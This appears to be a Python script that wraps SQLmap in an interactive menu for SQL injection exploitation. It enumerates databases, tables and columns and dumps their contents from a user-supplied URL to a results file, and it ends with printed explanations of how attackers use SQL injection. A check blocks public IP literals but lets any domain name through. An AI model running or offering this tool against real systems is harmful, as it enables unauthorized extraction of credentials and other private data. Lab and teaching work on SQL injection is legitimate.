import os
import logging
import subprocess
import sys
import ipaddress

# Ensure necessary directories exist
os.makedirs("logs", exist_ok=True)
os.makedirs("outputs", exist_ok=True)

# Setup Logging
LOG_FILE = "logs/exploit_errors.log"
SQLMAP_OUTPUT_FILE = "outputs/sqlmap_results.txt"

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")

def log_error(message):
    """Log an error message to the log file and print it to the console."""
    logging.error(message)
    print(f"\nâš  ERROR: {message}\n")
    if os.path.exists(LOG_FILE):
        print(f"âš  The error has been logged in: {LOG_FILE}")

def validate_url(url):
    """Check if the input is a valid URL or IP address and ensure it is a private IP or domain name."""
    if not url.strip():
        log_error("âš  ERROR: Target URL required. Please try again.")
        return False

    try:
        ip = ipaddress.ip_address(url)
        if not ip.is_private:
            log_error(f"âš  ERROR: Unauthorized scan attempt on public IP address {ip}. Exiting.")
            return False
        return True
    except ValueError:
        if url.startswith(("http://", "https://")):
            host = url.split("//")[-1].split("/")[0].split(":")[0]
            try:
                ip = ipaddress.ip_address(host)
                if not ip.is_private:
                    log_error(f"âš  ERROR: Unauthorized scan attempt on public IP address {ip}. Exiting.")
                    return False
                return True
            except ValueError:
                return True
        else:
            log_error("Invalid URL! Please enter a valid URL that starts with http:// or https://")
            return False

def get_valid_url():
    """Prompt user until they provide a valid private IP URL or domain."""
    while True:
        url = input("\nEnter the vulnerable URL (e.g., http://192.168.1.102/vuln.php?id=1): ").strip()
        if validate_url(url):
            return url

def check_sqlmap_installed():
    """Check if SQLmap is installed before running commands."""
    try:
        subprocess.run(["sqlmap", "--version"], capture_output=True, text=True, check=True)
    except FileNotFoundError:
        log_error("SQLmap is not installed! Install it using: sudo apt install sqlmap")

def run_sqlmap(target_url, option, db_name=None, table_name=None, column_names=None):
    """Run SQLmap for SQL Injection detection and exploitation."""
    print(f"\n[+] Running SQLmap on {target_url}...\n")
    command = ["sqlmap", "-u", target_url, "--batch"]
    if option == "1":
        command.append("--dbs")
    elif option == "2":
        command.extend(["-D", db_name, "--tables"])
    elif option == "3":
        command.extend(["-D", db_name, "-T", table_name, "--columns"])
    elif option == "4":
        command.extend(["-D", db_name, "-T", table_name, "-C", column_names, "--dump"] if column_names else ["-D", db_name, "-T", table_name, "--dump"])
    try:
        with open(SQLMAP_OUTPUT_FILE, "w") as output_file:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
            for line in iter(process.stdout.readline, ""):
                print(line, end="")
                output_file.write(line)
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                log_error(f"SQLmap execution failed: {stderr.strip()}")
        print(f"\nâœ… SQLmap scan complete! Results saved in {SQLMAP_OUTPUT_FILE}\n")
    except Exception as e:
        log_error(f"An error occurred while running SQLmap: {e}")

def sql_injection_module():
    """Interactive menu for SQL Injection exploitation."""
    print("\n========== SQL Injection Exploitation ==========")
    print("1. Find available databases")
    print("2. List tables from a database")
    print("3. List columns from a table")
    print("4. Dump data from a column or table")
    print("5. Exit")
    while True:
        choice = input("\nEnter your choice: ").strip()
        if choice == "1":
            target_url = get_valid_url()
            run_sqlmap(target_url, "1")
        elif choice == "2":
            target_url = get_valid_url()
            db_name = input("\nEnter the database name: ").strip()
            run_sqlmap(target_url, "2", db_name)
        elif choice == "3":
            target_url = get_valid_url()
            db_name = input("\nEnter the database name: ").strip()
            table_name = input("\nEnter the table name: ").strip()
            run_sqlmap(target_url, "3", db_name, table_name)
        elif choice == "4":
            target_url = get_valid_url()
            db_name = input("\nEnter the database name: ").strip()
            table_name = input("\nEnter the table name: ").strip()
            column_names = input("\nEnter column names (comma-separated, or press enter for all): ").strip()
            run_sqlmap(target_url, "4", db_name, table_name, column_names)
        elif choice == "5":
            print("\nðŸ‘‹ Exiting the SQL Injection Module...\n")
            break

def main():
    check_sqlmap_installed()  # Check for SQLmap installation
    sql_injection_module()  # Proceed with the SQL injection module

if __name__ == "__main__":
    main()

# Explanation for the user
print("\\n========== What the code has done ==========")
print("1. The tool checks if SQLmap is installed on the system.")
print("2. It prompts the user to enter a vulnerable URL to test for SQL injection.")
print("3. Based on the user's choice, it runs SQLmap with the appropriate options to find databases, list tables, columns, or dump data.")
print("4. The results of the scan are saved in a file for further review.")

print("\\n========== What is SQL Injection? ==========")
print("SQL Injection is a type of attack that allows attackers to interfere with the queries an application makes to its database.")
print("It typically occurs when an attacker is able to insert or manipulate SQL queries through an input field (such as a search bar or login form) that is not properly sanitized.")
print("SQL Injection can be used to retrieve sensitive data, manipulate the database, or gain unauthorized access to the system.")

print("\\n========== How is SQL Injection used? ==========")
print("Attackers use SQL injection to exploit vulnerabilities in an application's input fields to perform actions like:")
print("1. Retrieving hidden data from the database, such as user credentials.")
print("2. Modifying or deleting records in the database.")
print("3. Bypassing authentication mechanisms.")
print("4. Executing administrative operations on the database.")

print("\\nâœ… This tool helps identify and demonstrate the SQL injection vulnerability by automating the process with SQLmap.")
